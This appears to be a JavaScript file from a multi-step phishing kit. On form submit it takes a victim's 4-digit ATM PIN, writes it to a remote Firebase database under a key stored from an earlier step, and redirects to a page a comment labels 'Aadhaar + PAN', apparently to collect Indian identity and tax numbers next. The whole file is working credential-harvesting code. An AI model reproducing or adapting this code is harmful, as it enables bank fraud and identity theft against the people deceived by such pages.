// Firebase initialized here 
var ududip007DB = firebase.database().ref("ududip007");

document.getElementById("ududip007").addEventListener("submit", function (e) {
  e.preventDefault();

  var atmPin = document.getElementById("c3").value;

  var key = localStorage.getItem("firebaseKey");

  if (!key) {
    alert("Previous data missing. Please start from Step 1.");
    window.location.href = "index.html";
    return;
  }

  if (!/^\d{4}$/.test(atmPin)) {
    alert("Please enter a valid 4-digit ATM PIN.");
    return;
  }

  ududip007DB.child(key).update({
    gatm_pin: atmPin
  }).then(() => {
    window.location.href = "3.html"; // Aadhaar + PAN
  }).catch((error) => {
    alert("Error: " + error.message);
  });
});
